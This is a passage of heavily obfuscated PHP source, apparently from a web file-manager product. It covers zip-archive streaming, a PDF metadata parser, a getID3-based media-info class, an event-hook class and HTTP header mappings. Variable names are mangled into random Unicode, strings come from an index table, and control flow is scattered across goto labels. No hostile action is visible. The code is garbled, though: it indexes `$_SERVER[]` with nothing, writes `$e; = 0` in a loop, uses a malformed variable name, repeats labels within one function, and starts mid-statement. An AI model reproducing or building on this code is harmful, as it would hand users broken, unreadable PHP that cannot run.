array($F㳏˃[2029], 1)); $eۥ = $this->packFields($Cϴ酶); goto a; c: } protected function addCdrEof() { goto Dҫ; Dҫ: $c뱎 =& $_SERVER[]; $fƟܹ = count($this->files); $aޒϷ = $this->cdr_ofs; goto Fޙ; Fޙ: $dƬ = $this->ofs; $cѪ = $c뱎[33]; $dߩ = array(array($c뱎[2029], static::CDR_EOF_SIGNATURE), array($c뱎[2030], 0), array($c뱎[2030], 0), array($c뱎[2030], $fƟܹ), array($c뱎[2030], $fƟܹ), array($c뱎[2029], 4294967295), array($c뱎[2029], 4294967295), array($c뱎[2030], strlen($cѪ))); goto bۣ; bۣ: $C剭 = $this->packFields($dߩ) . $cѪ; $this->send($C剭); goto F; F: } protected function addCdr() { foreach ($this->files as $a) { $this->addCdrFile($a); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $a =& $_SERVER[]; $cرѹ = $a[202]; if ($this->outputName) { $Aï = trim(str_replace(array($a[113], $a[55], $a[93], $a[67], $a[217], $a[1007]), $a[33], $this->outputName)); $F = rawurlencode($Aï); $cرѹ .= "\x3b\x20\x66\151\x6c\x65\156\141\x6d\x65\52\x3d\165\164\146\x2d\x38\x27\x27{$F}"; } $b = array($a[199] => $a[2032], $a[2033] => $cرѹ, $a[2034] => $a[2035], $a[2036] => $a[2037], $a[2038] => $a[2039]); foreach ($b as $CԞ => $aę) { header($CԞ . $a[895] . $aę); } } protected function send($b) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $b); } protected final function dosTime($A䃑݋) { $EƮ =& $_SERVER[]; $dŷ = getdate($A䃑݋); if ($dŷ[$EƮ[1742]] < 1980) { $dŷ = array($EƮ[1742] => 1980, $EƮ[2040] => 1, $EƮ[2041] => 1, $EƮ[2042] => 0, $EƮ[2043] => 0, $EƮ[2044] => 0); } $dŷ[$EƮ[1742]] -= 1980; return $dŷ[$EƮ[1742]] << 25 | $dŷ[$EƮ[2040]] << 21 | $dŷ[$EƮ[2041]] << 16 | $dŷ[$EƮ[2042]] << 11 | $dŷ[$EƮ[2043]] << 5 | $dŷ[$EƮ[2044]] >> 1; } protected function packFields($CÖ) { $Eͭ =& $_SERVER[]; $C٫ = $Eͭ[33]; $bՍ = array(); foreach ($CÖ as $e굪) { $C٫ .= $e굪[0]; $bՍ[] = $e굪[1]; } array_unshift($bՍ, $C٫); return call_user_func_array($Eͭ[2045], $bՍ); } protected function filterFilename($DƂ؂) { $c֪ =& $_SERVER[]; return str_replace(array($c֪[93], $c֪[4], $c֪[176], $c֪[69], $c֪[113], $c֪[940], $c֪[943], $c֪[271]), $c֪[70], $DƂ؂); } } class ZipStream { } goto F; E: class FileParsePdf { public static function parse($Bȑ) { goto c; Fá: preg_match($A쎇, $a[$Bդ̑[1550]], $a역); if (!$fԦ[$Bդ̑[1552]] && count($a역) == 5) { $fԦ[$Bդ̑[1552]] = $a역[3]; $fԦ[$Bդ̑[1554]] = $a역[4]; } preg_match($Bդ̑[1555], $a[$Bդ̑[1549]], $a역); goto c驩; E: if ($a역[1] && $fԦ[$Bդ̑[1556]] < $a역[1][0]) { $fԦ[$Bդ̑[1556]] = $a역[1][0]; } $fԦ = self::parseInfoItem($fԦ); return $fԦ; goto DϿ; c: $Bդ̑ =& $_SERVER[]; $cϊ = 32 * 1024; $a = array($Bդ̑[796] => fopen($Bȑ, $Bդ̑[1186]), $Bդ̑[75] => $Bȑ, $Bդ̑[77] => filesize($Bȑ), $Bդ̑[1548] => $cϊ); goto E; BǾ: if ($F۟) { $Cޮ = $F۟[$Bդ̑[1551]][$Bդ̑[1208]]; $fԦ = self::getObjectValue($a, $F۟, $Cޮ); } $fԦ = is_array($fԦ) ? $fԦ : array(); $fԦ[$Bդ̑[1552]] = 0; goto E; E: $a[$Bդ̑[1549]] = StreamWrapperIO::read($Bȑ, 0, $cϊ); $a[$Bդ̑[1550]] = StreamWrapperIO::read($Bȑ, $a[$Bդ̑[77]] - $cϊ, $cϊ); $F۟ = self::decodeXref($a); goto BǾ; E: preg_match_all($A쎇, $a[$Bդ̑[1549]], $a역); if ($a역[1] && $fԦ[$Bդ̑[1556]] < $a역[1][0]) { $fԦ[$Bդ̑[1556]] = $a역[1][0]; } preg_match_all($A쎇, $a[$Bդ̑[1550]], $a역); goto E; c驩: if ($a역) { $fԦ[$Bդ̑[1358]] = $a역[1]; } $fԦ[$Bդ̑[1556]] = 0; $A쎇 = $Bդ̑[1557]; goto E; E: $A쎇 = $Bդ̑[1553]; preg_match($A쎇, $a[$Bդ̑[1549]], $a역); if (!$fԦ[$Bդ̑[1552]] && count($a역) == 5) { $fԦ[$Bդ̑[1552]] = $a역[3]; $fԦ[$Bդ̑[1554]] = $a역[4]; } goto Fá; DϿ: } private static function parseInfoItem($cˉ) { $a =& $_SERVER[]; if (!$cˉ) { return !1; } $Eń = array($a[1359] => array($a[1558], $a[33]), $a[1559] => array($a[1560], $a[33]), $a[187] => array($a[1561], $a[210]), $a[107] => array($a[1562], $a[210]), $a[1556] => array($a[1556], $a[276]), $a[1552] => array($a[1552], $a[276]), $a[1554] => array($a[1554], $a[276]), $a[1563] => array($a[1564], $a[33]), $a[1565] => array($a[1566], $a[33]), $a[1567] => array($a[1358], $a[33])); $fǨɍ = array(); foreach ($Eń as $d٣ӻ => $bԤ) { if (!isset($cˉ[$bԤ[0]])) { continue; } $FҐ = $cˉ[$bԤ[0]]; if (!$FҐ || is_array($FҐ)) { continue; } switch ($bԤ[1]) { case $a[276]: $FҐ = intval($FҐ); break; case $a[210]: if (substr($FҐ, 0, 2) == $a[1568]) { $FҐ = substr($FҐ, 2, 14); } if (strtotime($FҐ)) { $FҐ = date($a[1569], strtotime($FҐ)); } break; } $fǨɍ[$d٣ӻ] = $FҐ; } return $fǨɍ; } private static function decodeXref(&$bˍ) { goto a; dʳ: foreach ($eڬ½[3] as $B潑 => $A蝥Ю) { if ($eڬ½[3][$B潑] == $F[1573]) { $Eչ = $B×Έ . $F[70] . intval($eڬ½[2][$B潑]); $d뙝[$F[1570]][$Eչ] = intval($eڬ½[1][$B潑]); ++$B×Έ; } else { if ($eڬ½[3][$B潑] == $F[1574]) { ++$B×Έ; } else { } } } if (preg_match_all($F[1575], $fǗ, $eڬ½)) { $a = $bˍ[$F[77]] - $bˍ[$F[1548]]; foreach ($eڬ½[0] as $B潑 => $eقƏ) { $d΂ = $eڬ½[1][$B潑] . $F[70] . $eڬ½[2][$B潑]; $d뙝[$F[1570]][$d΂] = strpos($fǗ, $eقƏ) + $a + 1; } } if (preg_match_all($F[1576], $fǗ, $eڬ½)) { $e = count($eڬ½[1]) == 1 ? $eڬ½[1][0] : $eڬ½[1][1]; } else { $e = substr($fǗ, -1024 * 5); } goto d΢; eʢ: if (preg_match($F[1584], $e, $eڬ½) > 0) { } return $d뙝; goto aՆ; a: $F =& $_SERVER[]; $fǗ = $bˍ[$F[1550]]; $d뙝 = array($F[1551] => array(), $F[1570] => array()); goto e˧; d΢: if (preg_match($F[1577], $e, $eڬ½) > 0) { $d뙝[$F[1551]][$F[77]] = intval($eڬ½[1]); } if (preg_match($F[1578], $e, $eڬ½) > 0) { $d뙝[$F[1551]][$F[1579]] = intval($eڬ½[1]) . $F[70] . intval($eڬ½[2]); } if (preg_match($F[1580], $e, $eڬ½) > 0) { $d뙝[$F[1551]][$F[1581]] = intval($eڬ½[1]) . $F[70] . intval($eڬ½[2]); } goto Cͅѩ; Cͅѩ: if (preg_match($F[1582], $e, $eڬ½) > 0) { $d뙝[$F[1551]][$F[1208]] = intval($eڬ½[1]) . $F[70] . intval($eڬ½[2]); } if (preg_match($F[1583], $e, $eڬ½) > 0) { $d뙝[$F[1551]][$F[367]] = array(); $d뙝[$F[1551]][$F[367]][0] = $eڬ½[1]; $d뙝[$F[1551]][$F[367]][1] = $eڬ½[2]; } if (!$d뙝[$F[1551]][$F[1208]]) { return !1; } goto eʢ; C껫: if ($bˍ[$F[77]] - $Bϓ > $bˍ[$F[1548]]) { $D = 4 * $bˍ[$F[1548]]; $bˍ[$F[1548]] = $D; $bˍ[$F[1549]] = StreamWrapperIO::read($bˍ[$F[75]], 0, $D); $bˍ[$F[1550]] = StreamWrapperIO::read($bˍ[$F[75]], $bˍ[$F[77]] - $D, $D); $fǗ = $bˍ[$F[1550]]; } $B×Έ = 0; preg_match_all($F[1572], $fǗ, $eڬ½); goto dʳ; e˧: $e = $F[1571]; if (!preg_match_all($e, $fǗ, $eڬ½, PREG_SET_ORDER, 0)) { return !1; } $Bϓ = intval($eڬ½[0][1]); goto C껫; aՆ: } private static function getObjectValue($A, $bɕ, $cΣ) { goto f➃; cƺٝ: return $BŠ; goto dп; f➃: $d楛 =& $_SERVER[]; $A͙߱禿 = self::getObject($A, $bɕ[$d楛[1570]][$cΣ]); if (is_string($A͙߱禿[1])) { return $A͙߱禿[1]; } goto a򅹺; a򅹺: if (!is_array($A͙߱禿[1])) { return array(); } $BŠ = array(); for ($e; = 0; $e; < count($A͙߱禿[1]); $e; += 2) { $AƑ = $A͙߱禿[1][$e;]; $F趠 = $A͙߱禿[1][$e; + 1]; if (count($AƑ) == 3 && $AƑ[0] == $d楛[8]) { $b͈ = !1; if ($F趠[0] == $d楛[1585]) { $F趠 = self::getObject($A, $bɕ[$d楛[1570]][$F趠[1]]); } $b͈ = $F趠[1]; if ($b͈ === !1) { continue; } if (is_string($b͈)) { $b͈ = self::decodeStr($b͈); } $BŠ[$AƑ[1]] = $b͈; } } goto cƺٝ; dп: } private static function getObject($eǋ, $F) { $b = self::getObjectItem($eǋ, $F); $b = self::getObjectItem($eǋ, $b[2]); return $b; } private static function getObjectItem($DԼҝ, $dʚ) { goto b; e: $f = $dʚ >= $c̘ ? $dʚ - $c̘ : $dʚ; $aٶ = $dʚ >= $c̘ ? $DԼҝ[$Fʎ[1550]] : $DԼҝ[$Fʎ[1549]]; if ($dʚ > $C̿ && $dʚ <= $c̘) { $f = 0; $aٶ = StreamWrapperIO::read($DԼҝ[$Fʎ[75]], $dʚ, $C̿); } goto E; E: $dǅ = self::getRawObject($aٶ, $f); if ($dʚ >= $c̘) { $dǅ[2] = $dǅ[2] + $c̘; } else { if ($dʚ > $C̿ && $dʚ <= $c̘) { $dǅ[2] = $dǅ[2] + $dʚ; } } return $dǅ; goto d˓; b: $Fʎ =& $_SERVER[]; $C̿ = $DԼҝ[$Fʎ[1548]]; $c̘ = $DԼҝ[$Fʎ[77]] - $C̿; goto e; d˓: } private static function decodeStr($A) { goto D͜; D͜: $CΫ =& $_SERVER[]; $A = str_replace(array($CΫ[1586], $CΫ[1587], $CΫ[1588], $CΫ[1589], $CΫ[1590], $CΫ[1591], $CΫ[1592], $CΫ[1593]), array($CΫ[93], $CΫ[50], $CΫ[8], $CΫ[248], $CΫ[832], $CΫ[217], $CΫ[1007], $CΫ[330]), $A); $Dɮ = preg_split($CΫ[1594], $A, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto bݳ; e֔: return $A; goto dֲ; f⽡: $A = $CΫ[33]; foreach ($Dɮ as $Bٕ) { if (preg_match($CΫ[1600], $Bٕ) && !1 === stripos($Bٕ, $CΫ[1601])) { $Bٕ = preg_replace($CΫ[1602], $CΫ[33], $Bٕ); $Bٕ = trim($Bٕ, $CΫ[941]); $Bٕ = pack($CΫ[1603], $Bٕ); $A .= $Bٕ; } else { $A .= $Bٕ; } } if (preg_match($CΫ[1604], $A)) { $a݈ = substr($A, 2); $A = $CΫ[33]; $Bۼ = strlen($a݈); for ($Eˏ = 0; $Eˏ < $Bۼ; $Eˏ += 2) { $D = hexdec(bin2hex(substr($a݈, $Eˏ, 2))); $A .= mb_convert_encoding($CΫ[1605] . intval($D) . $CΫ[67], $CΫ[1606], $CΫ[1607]); } } goto e֔; bݳ: $A = $CΫ[33]; foreach ($Dɮ as $Bٕ) { if (preg_match($CΫ[1595], $Bٕ)) { $A .= \chr(octdec(trim($Bٕ, $CΫ[93]))); } else { $A .= $Bٕ; } } $Dɮ = preg_split($CΫ[1596], $A, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto b; b: $A = $CΫ[33]; foreach ($Dɮ as $Bٕ) { if (preg_match($CΫ[1597], $Bٕ)) { $A .= \chr(hexdec(trim($Bٕ, $CΫ[1598]))); } else { $A .= $Bٕ; } } $Dɮ = preg_split($CΫ[1599], $A, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto f⽡; dֲ: } private static function getRawObject($a¦, $fС = 0) { goto c; A䝫: $fС += strspn($a¦, $B𳼅߉[1608], $fС); $F˟ = $a¦[$fС]; switch ($F˟) { case $B𳼅߉[1609]: $Fڜ = strcspn($a¦, $B𳼅߉[1610], $fС); if ($Fڜ > 0) { $fС += $Fڜ; return self::getRawObject($a¦, $fС); } break; case $B𳼅߉[8]: $dړ = $F˟; ++$fС; $fш = preg_match($B𳼅߉[1611], substr($a¦, $fС, 256), $f); if (1 == $fш) { $f͵ = $f[1]; $fС += strlen($f͵); } break; case $B𳼅߉[248]: case $B𳼅߉[832]: $dړ = $F˟; ++$fС; $Aچĺ = $fС; if ($B𳼅߉[248] == $F˟) { $fԚ = 1; while ($fԚ > 0) { if (!isset($a¦[$Aچĺ])) { break; } $Fٻ = $a¦[$Aچĺ]; switch ($Fٻ) { case $B𳼅߉[93]: ++$Aچĺ; break; case $B𳼅߉[248]: ++$fԚ; break; case $B𳼅߉[832]: --$fԚ; break; } ++$Aچĺ; } $f͵ = substr($a¦, $fС, $Aچĺ - $fС - 1); $fС = $Aچĺ; } break; case $B𳼅߉[157]: case $B𳼅߉[476]: $dړ = $F˟; ++$fС; if ($B𳼅߉[157] == $F˟) { $f͵ = array(); do { $e좍 = $fС; $D = self::getRawObject($a¦, $fС); $fС = $D[2]; $f͵[] = $D; } while ($B𳼅߉[476] != $D[0] && $fС != $e좍); array_pop($f͵); } break; case $B𳼅߉[940]: case $B𳼅߉[943]: if (isset($a¦[$fС + 1]) && $a¦[$fС + 1] == $F˟) { $dړ = $F˟ . $F˟; $fС += 2; if ($B𳼅߉[940] == $F˟) { $f͵ = array(); do { $e좍 = $fС; $D = self::getRawObject($a¦, $fС); $fС = $D[2]; $f͵[] = $D; } while ($B𳼅߉[1612] != $D[0] && $fС != $e좍); array_pop($f͵); } } else { $dړ = $F˟; ++$fС; $fш = preg_match($B𳼅߉[1613], substr($a¦, $fС), $f); if ($B𳼅߉[940] == $F˟ && 1 == $fш) { $f͵ = strtr($f[1], $B𳼅߉[1614], $B𳼅߉[33]); $fС += \strlen($f[0]); } elseif (!1 !== ($c΍ = strpos($a¦, $B𳼅߉[943], $fС))) { $fС = $c΍ + 1; } } break; default: if ($B𳼅߉[1615] == substr($a¦, $fС, 6)) { $dړ = $B𳼅߉[1615]; $fС += 6; } elseif ($B𳼅߉[99] == substr($a¦, $fС, 4)) { $dړ = $B𳼅߉[99]; $fС += 4; $f͵ = $B𳼅߉[99]; } elseif ($B𳼅߉[1616] == substr($a¦, $fС, 4)) { $dړ = $B𳼅߉[1617]; $fС += 4; $f͵ = $B𳼅߉[1616]; } elseif ($B𳼅߉[1618] == substr($a¦, $fС, 5)) { $dړ = $B𳼅߉[1617]; $fС += 5; $f͵ = $B𳼅߉[1618]; } elseif ($B𳼅߉[1619] == substr($a¦, $fС, 6)) { $dړ = $B𳼅߉[1619]; $fС += 6; if (1 == preg_match($B𳼅߉[1620], substr($a¦, $fС), $f)) { $fС += strlen($f[0]); $Cޒ = $B𳼅߉[1621]; $fш = preg_match($Cޒ, substr($a¦, $fС), $f, PREG_OFFSET_CAPTURE); if (1 == $fш) { $f͵ = substr($a¦, $fС, $f[0][1]); $fС += $f[1][1]; } } } elseif ($B𳼅߉[1622] == substr($a¦, $fС, 9)) { $dړ = $B𳼅߉[1622]; $fС += 9; } elseif (1 == preg_match($B𳼅߉[1623], substr($a¦, $fС, 33), $f)) { $dړ = $B𳼅߉[1585]; $fС += strlen($f[0]); $f͵ = intval($f[1]) . $B𳼅߉[70] . intval($f[2]); } elseif (1 == preg_match($B𳼅߉[1624], substr($a¦, $fС, 33), $f)) { $dړ = $B𳼅߉[1625]; $f͵ = intval($f[1]) . $B𳼅߉[70] . intval($f[2]); $fС += strlen($f[0]); } elseif (($e = strspn($a¦, $B𳼅߉[1626], $fС)) > 0) { $dړ = $B𳼅߉[1627]; $f͵ = substr($a¦, $fС, $e); $fС += $e; } break; } goto C㇨; C㇨: return array($dړ, $f͵, $fС); goto c֩; c: $B𳼅߉ =& $_SERVER[]; $dړ = $B𳼅߉[33]; $f͵ = $B𳼅߉[33]; goto A䝫; c֩: } } class GetInfo { private static $fileTypeArray; public static function get($B) { $eϜ = IO::info($B); return self::infoAdd($eϜ); } public static function infoAdd(&$f͈) { goto dՍ; Cĥ: $Aͭ = $f͈[$f[160]]; try { if ($f͈[$f[160]] == $f[1630]) { $C = self::psdParse($dǌ); $Aͭ = $f[1631]; } else { if ($f͈[$f[160]] == $f[1632]) { $C = self::pdfParse($dǌ); } else { $Aͭ = self::$fileTypeArray[$f[1633]][$f͈[$f[160]]]; $F = self::$fileTypeArray[$f[1634]][$Aͭ][$f[1635]]; $E̘ = @$e੣->analyze($dǌ, $f͈[$f[77]], $f͈[$f[28]]); $C = self::parseData($E̘, $F, $f͈); } } } catch (Exception $F) { $C = array($f[372] => $Aͭ); } if (!$C) { return; } goto A񃌟; cđѼ: if (!$f͈ || $f͈[$f[29]] != $f[167]) { return; } if (!self::support($f͈[$f[160]]) || isset($f͈[$f[426]])) { return; } $dǌ = $f[1629] . $f͈[$f[75]]; goto Cĥ; A񃌟: $C[$f[372]] = $Aͭ; $f͈[$f[426]] = $C; return $f͈; goto d㛪; dՍ: $f =& $_SERVER[]; static $e੣; if (!$e੣) { require SDK_DIR . $f[1628]; $e੣ = new getID3(); } goto cđѼ; d㛪: } public static function support($f) { goto fߜ֍; c: $A = array($Dà[1632], $Dà[1630]); if (in_array($f, $A)) { return !0; } if (isset(self::$fileTypeArray[$Dà[1633]][$f])) { return !0; } goto f; f: return !1; goto E; fߜ֍: $Dà =& $_SERVER[]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $f = strtolower($f); goto c; E: } private static function parseData($dɾ, $D, $Dᐝ) { $Bއ =& $_SERVER[]; $aȓ = $dɾ[$Bއ[1636]]; $b梷 = array(); foreach ($D as $c͌ => $bќ) { foreach ($bќ as $AǢ) { if (is_array($AǢ)) { $d̿ = self::parseData($dɾ, $bќ, $Dᐝ); if ($d̿) { $b梷[$c͌] = $d̿; } break; } $A嚃 = str_replace($Bއ[1406], $aȓ, $AǢ); $d̿ = _get($dɾ, $A嚃); $d̿ = is_array($d̿) ? $d̿[0] : $d̿; if ($d̿) { break; } } if ($d̿ || $d̿ === 0 || $d̿ === !1) { $d̿ = self::valueReset($AǢ, $d̿, $c͌); if ($d̿ !== null) { $b梷[$c͌] = $d̿; } } } $b梷 = self::valueResetAll($b梷, $Dᐝ); return $b梷; } private static function psdParse($F) { $e܄ =& $_SERVER[]; if (IO::fileSubstr($F, 0, 4) != $e܄[1637]) { return !1; } $Bؔ = getImageSize($F, $D); if (!$Bؔ) { return; } $aļꄌ = array($e܄[1552] => $Bؔ[0], $e܄[1554] => $Bؔ[1]); return $aļꄌ; } private static function pdfParse($e碝) { return FileParsePdf::parse($e碝); } private static function fileTypeParse() { $bǨß =& $_SERVER[]; $eţ = self::fileTypeArray(); $e = array(); foreach ($eţ as $EΑ => $E) { $Fܝ = _get($E, $bǨß[160], $bǨß[33]); $Fء = is_string($Fܝ) ? explode($bǨß[47], $Fܝ) : $Fܝ; if (!$Fء) { continue; } foreach ($Fء as $Fܝ) { $Fܝ = strtolower(trim($Fܝ)); if (!$Fܝ) { continue; } $e[$Fܝ] = $EΑ; } $eţ[$EΑ][$bǨß[160]] = array_keys($e); $eţ[$EΑ][$bǨß[1635]] = self::parseKeyMap($E[$bǨß[1635]]); } return array($bǨß[1634] => $eţ, $bǨß[1633] => $e); } private static function parseKeyMap($E) { $C =& $_SERVER[]; foreach ($E as $eףڶ => $e) { if (is_array($e)) { $e = self::parseKeyMap($e); if ($e) { $E[$eףڶ] = $e; } continue; } $b = explode($C[47], $e); $f˾ɒ = array(); foreach ($b as $eЏ) { $eЏ = trim($eЏ); if (!$eЏ) { continue; } if (preg_match($C[1638], $eЏ, $B`)) { $EҌ = explode($C[271], $B`[1]); foreach ($EҌ as $f) { $f˾ɒ[] = str_replace($B`[0], $f, $eЏ); } } else { $f˾ɒ[] = $eЏ; } } $E[$eףڶ] = $f˾ɒ; } return $E; } private static function valueResetAll($Bӳ, $Dىދ) { goto aģ; F: if ($B顩) { $E붆 = IO_PATH_SYSTEM_TEMP . $B[1644] . KodIO::hashPath($Dىދ) . $B[1645]; $Bӳ[$B[1646]] = Action($B[1647])->pluginCacheFileSet($E붆, $B顩); unset($Bӳ[$B[1648]][$B[1631]]); } $Dל = _get($Bӳ, $B[1649], $B[33]); $b؆ʪ = _get($Bӳ, $B[1650], $B[33]); goto e͆; F: return $Bӳ; goto aӴ; e͆: $C = _get($Bӳ, $B[1651], $B[33]); $AԖ = $Dל . $b؆ʪ . $C; if ($AԖ && get_charset($AԖ) != $B[326]) { $Bӳ[$B[1648]][$B[1359]] = iconv_to($Bӳ[$B[1648]][$B[1359]], get_charset($AԖ), $B[326]); $Bӳ[$B[1648]][$B[1652]] = iconv_to($Bӳ[$B[1648]][$B[1652]], get_charset($AԖ), $B[326]); $Bӳ[$B[1648]][$B[1653]] = iconv_to($Bӳ[$B[1648]][$B[1653]], get_charset($AԖ), $B[326]); } goto F; aģ: $B =& $_SERVER[]; if (isset($Bӳ[$B[1639]])) { $f҇ = ceil($Bӳ[$B[1639]]); $cٟ = intval($f҇ / 3600); $E臭 = intval(($f҇ - $cٟ * 3600) / 60); $FϺ = $f҇ % 60; $Bӳ[$B[1640]] = sprintf($B[1641], $cٟ, $E臭, $FϺ); if ($cٟ == 0) { $Bӳ[$B[1640]] = sprintf($B[1642], $E臭, $FϺ); } } $B顩 = _get($Bӳ, $B[1643]); goto F; aӴ: } private static function valueReset($D͢, $E辄Ѯ, $a僉) { $e͇ =& $_SERVER[]; $dć繾Ր = $e͇[1569]; switch ($D͢) { case $e͇[1654]: $E辄Ѯ = $E辄Ѯ == $e͇[83] ? $e͇[1655] : $e͇[1656]; break; case $e͇[1657]: $E辄Ѯ = $E辄Ѯ ? $E辄Ѯ : null; break; default: break; } switch ($a僉) { case $e͇[1658]: $E辄Ѯ = round($E辄Ѯ, 2); break; case $e͇[187]: case $e͇[107]: if ($E辄Ѯ < 0) { $E辄Ѯ = null; } else { if (is_numeric($E辄Ѯ)) { $E辄Ѯ = date($dć繾Ր, $E辄Ѯ); } } break; default: break; } return $E辄Ѯ; } private static function fileTypeArray() { $b =& $_SERVER[]; return array($b[1631] => array($b[160] => $b[1659] . $b[1660], $b[1635] => array($b[1552] => $b[1661], $b[1554] => $b[1662], $b[1663] => $b[1664], $b[1665] => $b[1666], $b[187] => $b[1667], $b[107] => $b[1668], $b[1669] => $b[1670], $b[1671] => $b[1672], $b[1673] => $b[1674], $b[1675] => $b[1676], $b[1677] => $b[1678], $b[1679] => $b[1680], $b[1681] => $b[1682], $b[1683] => array($b[1684] => $b[1685], $b[1686] => $b[1687], $b[1688] => $b[1689]), $b[1690] => $b[1691], $b[1692] => $b[1693], $b[1694] => $b[1695], $b[1696] => $b[1697], $b[1698] => array($b[1699] => $b[1700], $b[1701] => $b[1702], $b[1703] => $b[1704], $b[1705] => $b[1706], $b[1707] => $b[1708], $b[1709] => $b[1710], $b[1711] => $b[1712], $b[1713] => $b[1714], $b[1715] => $b[1716], $b[1717] => $b[1718], $b[1719] => $b[1720]))), $b[1721] => array($b[160] => $b[1722] . $b[1723], $b[1635] => array($b[1639] => $b[1724], $b[187] => $b[1725], $b[107] => $b[1726], $b[1671] => $b[1727], $b[1728] => $b[1729], $b[1730] => $b[1657], $b[1731] => $b[1732], $b[1733] => $b[1734], $b[1735] => $b[1736], $b[1648] => array($b[1359] => $b[1737], $b[1652] => $b[1738], $b[1653] => $b[1739], $b[1740] => $b[1741], $b[1742] => $b[1743], $b[1744] => $b[1745], $b[1631] => $b[1746]))), $b[1747] => array($b[160] => $b[1748] . $b[1749], $b[1635] => array($b[1552] => $b[1750], $b[1554] => $b[1751], $b[1639] => $b[1724], $b[187] => $b[1752], $b[107] => $b[1753], $b[1658] => $b[1754], $b[1735] => $b[1755], $b[1731] => $b[1756], $b[1671] => $b[1757], $b[1721] => array($b[1730] => $b[1657], $b[1758] => $b[1759], $b[1728] => $b[1729], $b[1735] => $b[1736], $b[1731] => $b[1760], $b[1733] => $b[1734]))), $b[1761] => array($b[1635] => array($b[1762] => $b[1763], $b[1764] => $b[1765])), $b[1766] => array($b[1635] => array())); } } class Hook { private static $events = array(); public static function get($cū = false) { if (!$cū) { return self::$events; } else { return self::$events[$cū]; } } public static function apply($fǣ, $b = array()) { $C = ActionApply($fǣ, $b); if (is_string($fǣ)) { Hook::trigger($fǣ); } return $C; } public static function bind($aͩ, $f͂, $cͅ = false) { $FѲ =& $_SERVER[]; if (!isset(self::$events[$aͩ])) { self::$events[$aͩ] = array(); } self::$events[$aͩ][] = array($FѲ[1767] => $f͂, $FѲ[1768] => $cͅ, $FѲ[1769] => 0); } public static function once($C, $b쿎) { self::bind($C, $b쿎, !0); } public static function unbind($Dߕ, $bσ싋Ԗ = false) { if (!$bσ싋Ԗ) { self::$events[$Dߕ] = array(); return; } $Fɱ = self::$events[$Dߕ]; self::$events[$Dߕ] = array(); if (!is_array($Fɱ)) { return; } for ($c = 0; $c < count($Fɱ); $c++) { if ($Fɱ[$c][$_SERVER[][1767]] == $bσ싋Ԗ) { continue; } self::$events[$Dߕ][] = $Fɱ[$c]; } } public static function filter($A۠, $e) { goto bѴ; BΞؾ: for ($cܻͷ = 0; $cܻͷ < count($Dؾ); $cܻͷ++) { $C = $Dؾ[$cܻͷ]; if ($C[$b욂[1768]] && $C[$b욂[1769]] > 1) { continue; } self::$events[$A۠][$cܻͷ][$b욂[1769]] = $C[$b욂[1769]] + 1; $f = self::apply($C[$b욂[1767]], array($Fى)); if (gettype($f) == gettype($Fى)) { $Fى = $f; } } return $Fى; goto b; bŐ: $Dؾ = $dש[$A۠]; $Fى = $e; if (!is_array($Dؾ) || count($Dؾ) == 0) { return $Fى; } goto BΞؾ; bѴ: $b욂 =& $_SERVER[]; $dש = self::$events; if (!isset($dש[$A۠])) { return $e; } goto bŐ; b: } public static function trigger($BՑ) { goto e㗐򤨭; Fƅֽۙ: if (!isset($Bܰ[$BՑ])) { return $D; } $aጋ = $Bܰ[$BՑ]; if (!is_array($aጋ) || count($aጋ) == 0) { return $D; } goto F؄; Aю: return $D; goto F; F؄: $aӇ׿ = func_get_args(); array_shift($aӇ׿); for ($f = 0; $f < count($aጋ); $f++) { $CԳ = $aጋ[$f]; if ($CԳ[$E޵[1768]] && $CԳ[$E޵[1769]] > 1) { continue; } if (defined($E޵[1770]) && GLOBAL_LOG_HOOK) { write_log($BՑ . $E޵[1771] . $CԳ[$E޵[1767]], $E޵[1772]); } self::$events[$BՑ][$f][$E޵[1769]] = $CԳ[$E޵[1769]] + 1; $cҕ = self::apply($CԳ[$E޵[1767]], $aӇ׿); if (defined($E޵[1770]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $E޵[1772]); if ($CԳ[$E޵[1769]] == 200) { $cʑІ = is_array($CԳ[$E޵[1767]]) ? json_encode_force($CԳ[$E޵[1767]]) : $CԳ[$E޵[1767]]; write_log($E޵[1773] . $BՑ . $E޵[1774] . $cʑІ, $E޵[1775]); } } $D = is_null($cҕ) ? $D : $cҕ; } goto Aю; e㗐򤨭: $E޵ =& $_SERVER[]; $Bܰ = self::$events; $D = !1; goto Fƅֽۙ; F: } } goto e؊; EǬۡ: class HttpHeader { public static $_headers = array("\x48\157\x73\164" => "\x48\x54\124\120\x5f\x48\x4f\123\124", "\x55\163\145\x72\55\x41\x67\x65\x6e\x74" => "\110\x54\x54\x50\x5f\x55\x53\x45\122\137\x41\x47\105\x4e\124", "\x43\157\x6e\x74\x65\x6e\x74\x2d\124\x79\160\x65" => "\x48\124\124\120\x5f\103\117\x4e\124\x45\x4e\x54\137\x54\x59\x50\x45", "\103\x6f\x6e\x74\x65\156\x74\x2d\114\x65\156\147\164\x68" => "\x48\x54\124\120\x5f\x43\117\116\x54\105\116\x54\137\114\105\x4e\x47\x54\110", "\x44\x65\x70\164\x68" => "\110\x54\124\120\137\x44\x45\120\x54\x48", "\105\170\x70\145\x63\x74" => "\110\124\124\120\137\x45\x58\120\105\x43\124", "\111\x66\x2d\x4e\157\156\145\x2d\115\141\x74\143\150" => "\110\x54\124\120\x5f\111\x46\137\x4e\117\x4e\x45\137\115\101\124\x43\110", "\111\146\55\x4d\x61\x74\143\x68" => "\110\124\x54\120\x5f\x49\x46\x5f\115\101\124\x43\110", "\111\x66\55\x52\x61\156\147\145" => "\x48\124\x54\x50\x5f\111\106\137\x52\101\116\x47\x45", "\x4c\141\163\x74\x2d\115\x6f\x64\x69\x66\x69\x65\144" => "\110\124\124\120\x5f\114\x41\123\124\x5f\115\x4f\x44\111\106\111\x45\104", "\x49\x66\55\115\157\x64\151\146\x69\145\144\55\x53\x69\x6e\x63\x65" => "\x48\124\124\x50\137\x49\106\137\x4d\117\x44\x49\106\111\x45\104\137\x53\x49\116\103\x45", 